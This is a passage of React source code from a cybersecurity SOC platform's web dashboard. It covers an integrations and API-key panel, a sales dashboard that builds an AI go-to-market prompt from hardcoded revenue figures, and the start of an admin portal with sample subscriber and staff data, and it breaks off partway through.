              <button onClick={saveAnthropicKey} disabled={!anthropicKey.trim()||keyStatus==='saving'} style={{padding:'8px 16px',borderRadius:7,border:'none',background:keyStatus==='error'?'#f0405e':'#4f8fff',color:'#fff',fontSize:'0.74rem',fontWeight:700,cursor:anthropicKey.trim()?'pointer':'not-allowed',fontFamily:'Inter,sans-serif',flexShrink:0,opacity:anthropicKey.trim()?1:0.5}}>
                {keyStatus==='saving'?'Saving…':keyStatus==='error'?'✗ Failed':'Save Key'}
              </button>
            </div>
            <div style={{fontSize:'0.62rem',color:'var(--wt-dim)',marginTop:8}}>
              Get your key at <a href='https://console.anthropic.com/account/keys' target='_blank' rel='noopener noreferrer' onClick={e=>e.stopPropagation()} style={{color:'#4f8fff',textDecoration:'none'}}>console.anthropic.com</a> · Tenant: <code style={{fontFamily:'JetBrains Mono,monospace',fontSize:'0.6rem',background:'var(--wt-border)',padding:'1px 4px',borderRadius:2}}>{aiTestStatus?.tenantId || 'global'}</code>
            </div>
          </>
        )}
        {aiTestStatus?.ok && (
          <>
          <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',lineHeight:1.6}}>
            AI triage, Co-Pilot, and remediation assistant are all active.
          </div>
          <button onClick={handleRemoveKey} style={{marginTop:8,padding:'5px 12px',borderRadius:7,border:'1px solid #f0405e25',background:'#f0405e0a',color:'#f0405e',fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Remove Key</button>
          </>
        )}
      </div>

      <div style={{display:'flex',flexDirection:'column',gap:6}}>
        {filtered.map(tool=>{
          const isOn = !!connected[tool.id];
          return (
            <div key={tool.id} style={{padding:'12px 16px',background:'var(--wt-card)',border:`1px solid ${isOn?'#22c99218':'var(--wt-border)'}`,borderRadius:10,display:'flex',alignItems:'center',gap:12}}>
              <div style={{width:9,height:9,borderRadius:'50%',background:isOn?'#22c992':'#252e42',boxShadow:isOn?'0 0 7px #22c992':'none',flexShrink:0}} />
              <div style={{flex:1}}>
                <div style={{display:'flex',alignItems:'center',gap:6,marginBottom:1}}>
                  <span style={{fontSize:'0.82rem',fontWeight:700}}>{tool.name}</span>
                  <span style={{fontSize:'0.5rem',fontWeight:700,padding:'1px 6px',borderRadius:3,background:'#4f8fff12',color:'#4f8fff',border:'1px solid #4f8fff18'}}>{tool.category}</span>
                </div>
                <div style={{fontSize:'0.64rem',color:isOn?'#22d49a':'var(--wt-muted)',display:'flex',alignItems:'center',gap:4}}>
                  {isOn && <span style={{width:5,height:5,borderRadius:'50%',background:'#22c992',boxShadow:'0 0 5px #22c992',display:'block'}} />}
                  {isOn ? 'Connected' : tool.desc}
                </div>
                {isOn && connected[tool.id] && (
                  <div style={{fontSize:'0.58rem',color:'var(--wt-dim)',marginTop:2}}>
                    {Object.entries(connected[tool.id]).filter(([k])=>!k.includes('secret')&&!k.includes('password')&&!k.includes('token')&&!k.includes('key')).slice(0,2).map(([k,v])=>(
                      <span key={k} style={{marginRight:8}}>{k}: <span style={{fontFamily:'JetBrains Mono,monospace'}}>{String(v).slice(0,20)}</span></span>
                    ))}
                  </div>
                )}
              </div>
              {isOn
                ? <button onClick={()=>{if(window.confirm('Disconnect '+tool.name+'?')) handleDisconnect(tool.id);}} style={{padding:'5px 14px',borderRadius:7,border:'1px solid #f0405e30',background:'#f0405e10',color:'#f0405e',fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',display:'flex',alignItems:'center',gap:5}}>🗑 Disconnect</button>
                : <button onClick={()=>openModal(tool)} style={{padding:'5px 14px',borderRadius:7,border:'1px solid #4f8fff40',background:'#4f8fff12',color:'#4f8fff',fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif'}}>+ Connect</button>}
            </div>
          );
        })}
      </div>
      {modal && (
        <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.8)',zIndex:200,display:'flex',alignItems:'center',justifyContent:'center',padding:20}} onClick={()=>setModal(null)}>
          <div style={{background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:16,maxWidth:480,width:'100%',padding:24,maxHeight:'85vh',overflow:'auto'}} onClick={e=>e.stopPropagation()}>
            <div style={{fontSize:'0.92rem',fontWeight:800,marginBottom:4}}>Connect {modal.name}</div>
            <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:18}}>Credentials are sent directly to the integration API for validation and never stored on our servers.</div>
            {(CRED_FIELDS[modal.id]||[]).map(f=>(
              <div key={f.key} style={{marginBottom:12}}>
                <div style={{fontSize:'0.68rem',fontWeight:600,color:'#8a9ab8',marginBottom:4}}>{f.label}</div>
                <input type={f.secret?'password':'text'} value={formVals[f.key]||''} onChange={e=>setFormVals(p=>({...p,[f.key]:e.target.value}))} placeholder={f.placeholder||''} style={{width:'100%',padding:'9px 12px',background:'var(--wt-bg)',border:'1px solid var(--wt-border2)',borderRadius:8,color:'var(--wt-text)',fontSize:'0.76rem',fontFamily:f.secret?'JetBrains Mono,monospace':'Inter,sans-serif',outline:'none'}} />
              </div>
            ))}
            {testResult && (
              <div style={{padding:'8px 12px',borderRadius:8,background:testResult.ok?'#22d49a0a':'#f0405e0a',border:`1px solid ${testResult.ok?'#22d49a20':'#f0405e20'}`,fontSize:'0.72rem',color:testResult.ok?'#22d49a':'#f0405e',marginBottom:12}}>
                {testResult.ok?'✓':'✗'} {testResult.message}
              </div>
            )}
            <div style={{display:'flex',gap:8,marginTop:4}}>
              <button onClick={handleTest} disabled={testing||Object.keys(formVals).length===0} style={{flex:1,padding:'9px 0',borderRadius:8,border:'1px solid #4f8fff30',background:'#4f8fff12',color:'#4f8fff',fontSize:'0.78rem',fontWeight:700,cursor:testing?'not-allowed':'pointer',fontFamily:'Inter,sans-serif',opacity:testing?0.7:1}}>
                {testing?'Testing…':'Test Connection'}
              </button>
              <button onClick={handleSave} disabled={!testResult?.ok} style={{flex:1,padding:'9px 0',borderRadius:8,border:'none',background:testResult?.ok?'#4f8fff':'var(--wt-border2)',color:testResult?.ok?'#fff':'#3a4050',fontSize:'0.78rem',fontWeight:700,cursor:testResult?.ok?'pointer':'not-allowed',fontFamily:'Inter,sans-serif'}}>
                Save & Connect
              </button>
              <button onClick={()=>setModal(null)} style={{padding:'9px 16px',borderRadius:8,border:'1px solid var(--wt-border2)',background:'transparent',color:'var(--wt-muted)',fontSize:'0.78rem',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>Cancel</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

const DASHBOARD_CSS = '*{margin:0;padding:0;box-sizing:border-box}\n        @keyframes pulse{0%,100%{opacity:1}50%{opacity:0.4}}\n        @keyframes spin{from{transform:rotate(0deg)}to{transform:rotate(360deg)}}\n\n        /* ── Dark theme (default) ── */\n        .wt-root {\n          --wt-bg: #050508;\n          --wt-sidebar: #07080f;\n          --wt-card: #09091a;\n          --wt-card2: #0a0d14;\n          --wt-border: #141820;\n          --wt-border2: #1e2536;\n          --wt-text: #e8ecf4;\n          --wt-muted: #6b7a94;\n          --wt-secondary: #8a9ab0;\n          --wt-dim: #3a4050;\n        }\n        /* ── Light theme ── */\n        .wt-root.light {\n          --wt-bg: #f5f6fa;\n          --wt-sidebar: #ffffff;\n          --wt-card: #ffffff;\n          --wt-card2: #f0f2f8;\n          --wt-border: #e2e5ef;\n          --wt-border2: #c8cedd;\n          --wt-text: #0f1117;\n          --wt-muted: #5a6580;\n          --wt-secondary: #4a5568;\n          --wt-dim: #8090a8;\n        }\n\n        .tab-btn{padding:7px 16px;border:none;background:transparent;cursor:pointer;font-size:0.76rem;font-weight:600;font-family:Inter,sans-serif;border-radius:8px;transition:all .15s;white-space:nowrap;color:var(--wt-muted)}\n        .tab-btn.active{background:#4f8fff18;color:#4f8fff}\n        .tab-btn:not(.active) {color:var(--wt-secondary);background:var(--wt-card2)}\n        .row-hover{transition:background .12s}\n        .row-hover:hover{background:var(--wt-card2)!important}\n        .vuln-row:hover{background:var(--wt-card2)!important;cursor:pointer}\n        .alert-card{border-radius:10px;border:1px solid var(--wt-border);background:var(--wt-card);transition:border-color .15s}\n        .alert-card:hover{border-color:#4f8fff28}';
// ─── Main Dashboard ───────────────────────────────────────────────────────────
// ─── Sales Dashboard ────────────────────────────────────────────────────────
function SalesDashboard() {
  const [mrrTarget, setMrrTarget] = useState('');
  const [arrTarget, setArrTarget] = useState('');
  const [aiAnalysis, setAiAnalysis] = useState(null);
  const [analysisLoading, setAnalysisLoading] = useState(false);

  // Current revenue data (in production, load from /api/admin/analytics)
  const CURRENT = {
    mrr: 2814,  // £ per month
    arr: 33768,
    customers: { mssp:2, business:3, team:2, community:1 },
    growth: { jan:1890, feb:2200, mar:2814 }, // last 3 months MRR
    churn: 1,
    newThisMonth: 1,
    pipeline: 4, // leads in pipeline
  };

  const PLAN_VALUES = {
    mssp:     { name:'MSSP',     mrr:799,  label:'£799+/mo', color:'#8b6fff', clients:'+ £79/client' },
    business: { name:'Business', mrr:199,  label:'£199/mo',  color:'#22d49a' },
    team:     { name:'Team',     mrr:196,  label:'~£196/mo', color:'#4f8fff', note:'avg 4 seats × £49' },
    community:{ name:'Community',mrr:0,    label:'Free',     color:'#6b7a94' },
  };

  const mrrGap = mrrTarget ? Math.max(0, parseInt(mrrTarget.replace(/[^0-9]/g,'')) - CURRENT.mrr) : 0;
  const arrGap = arrTarget ? Math.max(0, parseInt(arrTarget.replace(/[^0-9]/g,'')) - CURRENT.arr) : 0;
  const effectiveGap = mrrGap || (arrGap ? Math.ceil(arrGap/12) : 0);

  // Calculate how many of each plan type needed to fill the gap
  const mixes = effectiveGap > 0 ? [
    { label:'All MSSP',     plans:'MSSP partners', count:Math.ceil(effectiveGap/799),   mrr:Math.ceil(effectiveGap/799)*799,   color:'#8b6fff', note:'Highest value — longer sales cycle' },
    { label:'All Business', plans:'Business orgs', count:Math.ceil(effectiveGap/199),   mrr:Math.ceil(effectiveGap/199)*199,   color:'#22d49a', note:'Mid-market, 2-4 week close' },
    { label:'All Team',     plans:'Team plans',    count:Math.ceil(effectiveGap/147),   mrr:Math.ceil(effectiveGap/147)*147,   color:'#4f8fff', note:'SMB, fastest close, lower ACV' },
    { label:'Mixed (recommended)', plans:'1 MSSP + Business',
      count: 1 + Math.ceil(Math.max(0,effectiveGap-799)/199),
      mrr: 799 + Math.ceil(Math.max(0,effectiveGap-799)/199)*199,
      color:'#f0a030', note:'Balance of velocity + value' },
  ] : [];

  async function getAiAnalysis() {
    if (!effectiveGap || analysisLoading) return;
    setAnalysisLoading(true);
    setAiAnalysis(null);
    try {
      const prompt = `You are a SaaS sales strategist for Watchtower, a cybersecurity SOC platform.

Current metrics:
- MRR: £${CURRENT.mrr}/mo
- ARR: £${CURRENT.arr}/yr
- Customers: ${CURRENT.customers.mssp} MSSP, ${CURRENT.customers.business} Business, ${CURRENT.customers.team} Team
- MRR growth last 3 months: £${CURRENT.growth.jan} → £${CURRENT.growth.feb} → £${CURRENT.growth.mar}
- Churn this month: ${CURRENT.churn}
- New customers this month: ${CURRENT.newThisMonth}
- Leads in pipeline: ${CURRENT.pipeline}

Target: £${mrrTarget || Math.ceil(arrGap/12)+CURRENT.mrr}/mo MRR (gap: £${effectiveGap}/mo)

Plans:
- MSSP: £799/mo base + £79/client (target: MSSPs managing multiple clients)
- Business: £199/mo for 10 seats (target: mid-market security teams)
- Team: £49/seat/mo min 3 seats (target: SMB/startup with 3-15 analysts)
- Community: Free (conversion funnel)

Provide a concise go-to-market strategy to close the gap. Include:
1. IDEAL CUSTOMER PROFILE: Who to target (industry, company size, pain points)
2. CHANNELS: Top 3 acquisition channels for this target
3. CONVERSION: Key tactics to accelerate conversion
4. TIMELINE: Realistic timeline to hit the target
Keep it under 200 words, punchy and actionable.`;

      const res = await fetch('/api/copilot', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({prompt}),
      });
      const data = await res.json();
      setAiAnalysis(data.ok ? data.response : (data.error || data.message || 'Could not generate analysis. Check your Anthropic API key in Tools.'));
    } catch(e) { setAiAnalysis('Error generating analysis.'); }
    setAnalysisLoading(false);
  }

  // Auto-run analysis when target is set
  const prevGapRef = React.useRef(0);
  React.useEffect(()=>{
    if (effectiveGap > 0 && effectiveGap !== prevGapRef.current) {
      prevGapRef.current = effectiveGap;
      const t = setTimeout(getAiAnalysis, 800);
      return () => clearTimeout(t);
    }
  }, [effectiveGap]);

  const mrrGrowth = CURRENT.growth;
  const months = ['Jan','Feb','Mar'];

  return (
    <div style={{display:'flex',flexDirection:'column',gap:16}}>
      <div>
        <h2 style={{fontSize:'0.88rem',fontWeight:700,display:'flex',alignItems:'center',gap:8}}>
          📈 Sales Dashboard
          <span style={{fontSize:'0.62rem',color:'#22d49a',background:'#22d49a12',padding:'2px 8px',borderRadius:4,border:'1px solid #22d49a25',fontWeight:700}}>SALES</span>
        </h2>
        <div style={{fontSize:'0.68rem',color:'var(--wt-muted)',marginTop:2}}>Revenue performance, pipeline, and target planning</div>
      </div>

      {/* Current revenue stats */}
      <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}}>
        {[
          {label:'Monthly Recurring Revenue', val:`£${CURRENT.mrr.toLocaleString()}`, sub:'MRR', color:'#22d49a'},
          {label:'Annual Recurring Revenue',  val:`£${(CURRENT.arr/1000).toFixed(1)}k`, sub:'ARR', color:'#4f8fff'},
          {label:'Paying Customers',          val:CURRENT.customers.mssp+CURRENT.customers.business+CURRENT.customers.team, sub:`+${CURRENT.newThisMonth} this month`, color:'#8b6fff'},
          {label:'MoM Growth',                val:`+${Math.round((CURRENT.growth.mar-CURRENT.growth.feb)/CURRENT.growth.feb*100)}%`,sub:'vs last month',color:'#22d49a'},
        ].map(s=>(
          <div key={s.label} style={{padding:'14px 16px',background:'var(--wt-card)',border:`1px solid ${s.color}18`,borderRadius:12}}>
            <div style={{fontSize:'1.8rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.color,letterSpacing:-2,lineHeight:1}}>{s.val}</div>
            <div style={{fontSize:'0.58rem',fontWeight:700,color:s.color,textTransform:'uppercase',letterSpacing:'0.5px',marginTop:3}}>{s.sub}</div>
            <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:2}}>{s.label}</div>
          </div>
        ))}
      </div>

      {/* MRR trend + plan mix */}
      <div style={{display:'grid',gridTemplateColumns:'1fr 1fr',gap:12}}>

        {/* MRR trend bar chart */}
        <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px 18px'}}>
          <div style={{fontSize:'0.72rem',fontWeight:700,marginBottom:14}}>MRR Trend</div>
          <div style={{display:'flex',alignItems:'flex-end',gap:12,height:80}}>
            {months.map((m,i)=>{
              const val = Object.values(mrrGrowth)[i];
              const pct = (val / Math.max(...Object.values(mrrGrowth))) * 100;
              return (
                <div key={m} style={{flex:1,display:'flex',flexDirection:'column',alignItems:'center',gap:4}}>
                  <div style={{fontSize:'0.62rem',fontWeight:700,color:'#22d49a'}}>£{(val/1000).toFixed(1)}k</div>
                  <div style={{width:'100%',borderRadius:4,background:'#22d49a',height:pct+'%',minHeight:8,transition:'height .3s'}}/>
                  <div style={{fontSize:'0.58rem',color:'var(--wt-dim)'}}>{m}</div>
                </div>
              );
            })}
          </div>
          <div style={{marginTop:12,paddingTop:10,borderTop:'1px solid var(--wt-border)',display:'flex',justifyContent:'space-between'}}>
            <span style={{fontSize:'0.62rem',color:'var(--wt-muted)'}}>Pipeline: <strong style={{color:'#4f8fff'}}>{CURRENT.pipeline} leads</strong></span>
            <span style={{fontSize:'0.62rem',color:'var(--wt-muted)'}}>Churn: <strong style={{color:CURRENT.churn>0?'#f0405e':'#22d49a'}}>{CURRENT.churn} this month</strong></span>
          </div>
        </div>

        {/* Plan mix breakdown */}
        <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:12,padding:'16px 18px'}}>
          <div style={{fontSize:'0.72rem',fontWeight:700,marginBottom:14}}>Revenue by Plan</div>
          {Object.entries(PLAN_VALUES).map(([key,plan])=>{
            const count = CURRENT.customers[key] || 0;
            const rev = count * plan.mrr;
            const pct = CURRENT.mrr > 0 ? Math.round(rev/CURRENT.mrr*100) : 0;
            return count > 0 ? (
              <div key={key} style={{marginBottom:10}}>
                <div style={{display:'flex',justifyContent:'space-between',marginBottom:3}}>
                  <span style={{fontSize:'0.7rem',fontWeight:600}}>{plan.name} <span style={{color:'var(--wt-dim)',fontWeight:400}}>({count} customers)</span></span>
                  <span style={{fontSize:'0.7rem',fontWeight:700,color:plan.color}}>£{rev.toLocaleString()}/mo</span>
                </div>
                <div style={{height:6,borderRadius:3,background:'var(--wt-border)',overflow:'hidden'}}>
                  <div style={{height:'100%',borderRadius:3,background:plan.color,width:pct+'%',transition:'width .5s'}}/>
                </div>
              </div>
            ) : null;
          })}
        </div>
      </div>

      {/* Revenue target planner */}
      <div style={{background:'var(--wt-card)',border:'1px solid #4f8fff20',borderRadius:12,padding:'18px 20px'}}>
        <div style={{fontSize:'0.78rem',fontWeight:700,marginBottom:4}}>🎯 Revenue Target Planner</div>
        <div style={{fontSize:'0.7rem',color:'var(--wt-muted)',marginBottom:16}}>Set a target and get AI-powered recommendations on exactly which customers to acquire</div>

        <div style={{display:'flex',gap:12,marginBottom:16,flexWrap:'wrap'}}>
          <div style={{flex:1,minWidth:180}}>
            <label style={{display:'block',fontSize:'0.66rem',fontWeight:700,color:'var(--wt-muted)',marginBottom:6,textTransform:'uppercase',letterSpacing:'0.5px'}}>MRR Target</label>
            <div style={{position:'relative'}}>
              <span style={{position:'absolute',left:10,top:'50%',transform:'translateY(-50%)',fontSize:'0.88rem',color:'var(--wt-muted)',fontWeight:700}}>£</span>
              <input
                type='text' placeholder='e.g. 10000'
                value={mrrTarget}
                onChange={e=>{setMrrTarget(e.target.value.replace(/[^0-9]/g,''));setArrTarget('');setAiAnalysis(null);}}
                style={{width:'100%',padding:'10px 12px 10px 28px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:8,color:'var(--wt-text)',fontSize:'1rem',fontFamily:'JetBrains Mono,monospace',fontWeight:700,outline:'none',boxSizing:'border-box'}}
              />
            </div>
            <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:3}}>per month</div>
          </div>
          <div style={{display:'flex',alignItems:'center',fontSize:'0.7rem',color:'var(--wt-dim)',marginTop:20}}>or</div>
          <div style={{flex:1,minWidth:180}}>
            <label style={{display:'block',fontSize:'0.66rem',fontWeight:700,color:'var(--wt-muted)',marginBottom:6,textTransform:'uppercase',letterSpacing:'0.5px'}}>ARR Target</label>
            <div style={{position:'relative'}}>
              <span style={{position:'absolute',left:10,top:'50%',transform:'translateY(-50%)',fontSize:'0.88rem',color:'var(--wt-muted)',fontWeight:700}}>£</span>
              <input
                type='text' placeholder='e.g. 120000'
                value={arrTarget}
                onChange={e=>{setArrTarget(e.target.value.replace(/[^0-9]/g,''));setMrrTarget('');setAiAnalysis(null);}}
                style={{width:'100%',padding:'10px 12px 10px 28px',background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:8,color:'var(--wt-text)',fontSize:'1rem',fontFamily:'JetBrains Mono,monospace',fontWeight:700,outline:'none',boxSizing:'border-box'}}
              />
            </div>
            <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',marginTop:3}}>per year</div>
          </div>
          <div style={{flex:1,minWidth:180,padding:'14px',background:'var(--wt-card2)',borderRadius:8,border:'1px solid var(--wt-border)',display:'flex',flexDirection:'column',justifyContent:'center'}}>
            <div style={{fontSize:'0.6rem',color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:4}}>Gap to close</div>
            <div style={{fontSize:'1.6rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:effectiveGap>0?'#f0a030':'#22d49a',letterSpacing:-2}}>
              {effectiveGap>0 ? `£${effectiveGap.toLocaleString()}/mo` : effectiveGap===0&&(mrrTarget||arrTarget) ? '✓ On target' : '—'}
            </div>
            {effectiveGap > 0 && <div style={{fontSize:'0.62rem',color:'var(--wt-muted)',marginTop:2}}>= £{(effectiveGap*12).toLocaleString()} ARR needed</div>}
          </div>
        </div>

        {/* Plan mix options */}
        {mixes.length > 0 && (
          <div style={{marginBottom:16}}>
            <div style={{fontSize:'0.66rem',fontWeight:700,color:'var(--wt-dim)',textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:8}}>Customer Mix Options to Close the Gap</div>
            <div style={{display:'grid',gridTemplateColumns:'repeat(2,1fr)',gap:8}}>
              {mixes.map((mix,i)=>(
                <div key={i} style={{padding:'12px 14px',background:'var(--wt-card2)',border:`1px solid ${mix.color}25`,borderRadius:10}}>
                  <div style={{display:'flex',justifyContent:'space-between',alignItems:'flex-start',marginBottom:4}}>
                    <div style={{fontSize:'0.72rem',fontWeight:700,color:mix.color}}>{mix.label}</div>
                    <div style={{fontSize:'0.68rem',fontWeight:700,fontFamily:'JetBrains Mono,monospace',color:'var(--wt-text)'}}>£{mix.mrr.toLocaleString()}/mo</div>
                  </div>
                  <div style={{fontSize:'0.66rem',color:'var(--wt-secondary)',marginBottom:4}}><strong style={{color:mix.color}}>{mix.count}</strong> {mix.plans}</div>
                  <div style={{fontSize:'0.62rem',color:'var(--wt-dim)'}}>{mix.note}</div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* AI strategy */}
        {effectiveGap > 0 && (
          <div style={{padding:'14px 16px',background:'linear-gradient(135deg,rgba(79,143,255,0.05),rgba(139,111,255,0.05))',border:'1px solid #4f8fff20',borderRadius:10}}>
            <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:10}}>
              <span style={{fontSize:'0.62rem',fontWeight:700,color:'#4f8fff',textTransform:'uppercase',letterSpacing:'0.5px'}}>⚡ AI Go-to-Market Strategy</span>
              {analysisLoading && <span style={{fontSize:'0.62rem',color:'#4f8fff',display:'flex',alignItems:'center',gap:4}}><span style={{width:8,height:8,borderRadius:'50%',border:'2px solid #4f8fff',borderTopColor:'transparent',display:'block',animation:'spin 0.8s linear infinite'}}/>Generating strategy…</span>}
              {aiAnalysis && !analysisLoading && <button onClick={getAiAnalysis} style={{marginLeft:'auto',fontSize:'0.58rem',color:'var(--wt-dim)',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif'}}>↻ Regenerate</button>}
            </div>
            {analysisLoading && (
              <div style={{display:'flex',flexDirection:'column',gap:6}}>
                {[95,80,65,50].map((w,i)=>(
                  <div key={i} style={{height:10,borderRadius:4,background:'var(--wt-border)',width:w+'%',animation:'pulse 1.5s ease infinite',animationDelay:i*0.2+'s'}}/>
                ))}
              </div>
            )}
            {aiAnalysis && !analysisLoading && (
              <div style={{fontSize:'0.74rem',color:'var(--wt-secondary)',lineHeight:1.75,whiteSpace:'pre-line'}}>{aiAnalysis}</div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}


// ─── Admin Portal ────────────────────────────────────────────────────────────
function AdminPortal({ setCurrentTenant, setActiveTab, clientBanner, setClientBanner, adminBannerInput, setAdminBannerInput, userRole, setUserRole }) {
  const WTC_SUBSCRIBERS = [
    {id:'mssp-cyberguard', name:'CyberGuard Solutions',  type:'MSSP',     plan:'MSSP',     seats:0,  mrr:1115, clients:4,  status:'Active',  posture:84, alerts:36, incidents:7,  coverage:93, joined:'2024-01-10', billing:'Paid'},
    {id:'mssp-secureops',  name:'SecureOps Ltd',         type:'MSSP',     plan:'MSSP',     seats:0,  mrr:957,  clients:2,  status:'Active',  posture:79, alerts:22, incidents:4,  coverage:90, joined:'2024-03-15', billing:'Paid'},
    {id:'org-fintech',     name:'FinTech Global',        type:'Business', plan:'Business', seats:10, mrr:199,  clients:0,  status:'Active',  posture:88, alerts:12, incidents:2,  coverage:96, joined:'2024-02-01', billing:'Paid'},
    {id:'org-healthco',    name:'HealthCo Systems',      type:'Business', plan:'Business', seats:10, mrr:199,  clients:0,  status:'Active',  posture:72, alerts:19, incidents:3,  coverage:87, joined:'2024-04-20', billing:'Overdue'},
    {id:'org-logistics',   name:'Logistics UK Ltd',      type:'Business', plan:'Business', seats:10, mrr:199,  clients:0,  status:'Churned', posture:0,  alerts:0,  incidents:0,  coverage:0,  joined:'2023-11-01', billing:'Churned'},
    {id:'org-startup1',    name:'DevStack Inc',          type:'Team',     plan:'Team',     seats:4,  mrr:196,  clients:0,  status:'Active',  posture:91, alerts:5,  incidents:1,  coverage:98, joined:'2024-05-01', billing:'Paid'},
    {id:'org-startup2',    name:'CloudBase Ltd',         type:'Team',     plan:'Team',     seats:3,  mrr:147,  clients:0,  status:'Trial',   posture:65, alerts:8,  incidents:0,  coverage:78, joined:'2024-03-28', billing:'Trial'},
    {id:'org-free1',       name:'TestOrg Alpha',         type:'Community',plan:'Community',seats:1,  mrr:0,    clients:0,  status:'Active',  posture:55, alerts:2,  incidents:0,  coverage:60, joined:'2024-06-01', billing:'Free'},
  ];
  const [adminView, setAdminView] = useState('subscribers');
  const [filterPlan, setFilterPlan] = useState('All');
  const [filterStatus, setFilterStatus] = useState('All');

  // Users/Roles state
  const [staffUsers, setStaffUsers] = useState([
    {id:'u1', name:'Nick Taylor',    email:'nick@getwatchtower.io',   role:'owner',      status:'Active', joined:'2024-01-01', lastSeen:'Now'},
    {id:'u2', name:'Sarah Chen',     email:'sarah@getwatchtower.io',  role:'tech_admin', status:'Active', joined:'2024-03-15', lastSeen:'2h ago'},
    {id:'u3', name:'James Harlow',   email:'james@getwatchtower.io',  role:'sales',      status:'Active', joined:'2024-05-01', lastSeen:'1d ago'},
    {id:'u4', name:'Emma Wilson',    email:'emma@getwatchtower.io',   role:'viewer',     status:'Active', joined:'2024-06-20', lastSeen:'3d ago'},
    {id:'u5', name:'Invited User',   email:'ops@clientco.com',        role:'viewer',     status:'Pending',joined:'2024-07-01', lastSeen:'Never'},
  ]);
  const [inviteForm, setInviteForm] = useState({name:'',email:'',role:'viewer'});
  const [inviteStatus, setInviteStatus] = useState(null); // null | 'sending' | 'sent' | 'error'
  const [editingUser, setEditingUser] = useState(null);

  // Stripe config state
  const [stripeConfig, setStripeConfig] = useState({publishableKey:'',secretKey:'',webhookSecret:'',priceMssp:'',priceBusiness:'',priceTeamPerSeat:''});
  const [stripeSaving, setStripeSaving] = useState(false);

  // SAML config state
  const [samlConfig, setSamlConfig] = useState({enabled:false,idpEntityId:'',idpSsoUrl:'',idpCert:'',attributeMapping:{email:'email',name:'displayName',role:'role'},defaultRole:'viewer',domains:'',spEntityId:''});
  const [samlSaving, setSamlSaving] = useState(false);
  const [samlSaved, setSamlSaved] = useState(false);
  React.useEffect(()=>{
    fetch('/api/admin/saml-config').then(r=>r.json()).then(d=>{
      if(d.ok&&d.configured) setSamlConfig(prev=>({...prev,...d,domains:Array.isArray(d.domains)?d.domains.join(','):d.domains||''}));
    }).catch(()=>{});
  },[]);
  const [stripeSaved, setStripeSaved] = useState(false);
  const [stripeLoaded, setStripeLoaded] = useState(false);
  React.useEffect(()=>{
    fetch('/api/admin/stripe-config').then(r=>r.json()).then(d=>{
      if (d.ok && d.configured) setStripeConfig(prev=>({...prev,...d}));
      setStripeLoaded(true);
    }).catch(()=>setStripeLoaded(true));
  },[]);

  const activeSubs = WTC_SUBSCRIBERS.filter(s=>s.status!=='Churned');
  const totalMRR = WTC_SUBSCRIBERS.reduce((s,c)=>s+c.mrr,0);
  const overdueRevenue = WTC_SUBSCRIBERS.filter(s=>s.billing==='Overdue').reduce((s,c)=>s+c.mrr,0);
  const totalMSSPs = WTC_SUBSCRIBERS.filter(s=>s.type==='MSSP').length;
  const totalManagedClients = WTC_SUBSCRIBERS.filter(s=>s.type==='MSSP').reduce((s,c)=>s+c.clients,0);
  const filtered = WTC_SUBSCRIBERS.filter(s=>(filterPlan==='All'||s.plan===filterPlan)&&(filterStatus==='All'||s.status===filterStatus));
  const planColor = {MSSP:'#8b6fff',Business:'#22d49a',Team:'#4f8fff',Community:'#6b7a94'};
  const statusColor = {Active:'#22d49a',Trial:'#f0a030',Overdue:'#f0405e',Churned:'#3a4050',Free:'#6b7a94'};

  return (
    <div style={{display:'flex',flexDirection:'column',gap:16}}>
      <div style={{display:'flex',alignItems:'center',gap:10,flexWrap:'wrap'}}>
        <div>
          <h2 style={{fontSize:'0.88rem',fontWeight:700,display:'flex',alignItems:'center',gap:8}}>
            🔧 Watchtower Admin
            <span style={{fontSize:'0.62rem',color:'#f0a030',background:'#f0a03012',padding:'2px 8px',borderRadius:4,border:'1px solid #f0a03025',fontWeight:700}}>PLATFORM ADMIN</span>
          </h2>
          <div style={{fontSize:'0.68rem',color:'var(--wt-muted)',marginTop:3}}>All organisations subscribed to Watchtower · Impersonate any tenant to view their dashboard</div>
        </div>
        <div style={{marginLeft:'auto',display:'flex',gap:4,background:'var(--wt-card2)',borderRadius:7,padding:3}}>
          {['subscribers','users','platform','stripe','saml','broadcast'].map(v=>(
            <button key={v} onClick={()=>setAdminView(v)} style={{padding:'5px 14px',borderRadius:5,border:'none',background:adminView===v?'#f0a030':'transparent',color:adminView===v?'#fff':'var(--wt-muted)',fontSize:'0.68rem',fontWeight:700,cursor:'pointer',fontFamily:'Inter,sans-serif',textTransform:'capitalize'}}>{v}</button>
          ))}
        </div>
      </div>

      <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:8}}>
        {[
          {label:'Total MRR',      val:`£${totalMRR.toLocaleString()}`, sub:'monthly recurring', color:'#22d49a'},
          {label:'Active Orgs',    val:activeSubs.length,  sub:`${WTC_SUBSCRIBERS.length} total`, color:'#4f8fff'},
          {label:'MSSP Partners',  val:totalMSSPs,  sub:`${totalManagedClients} end-clients`, color:'#8b6fff'},
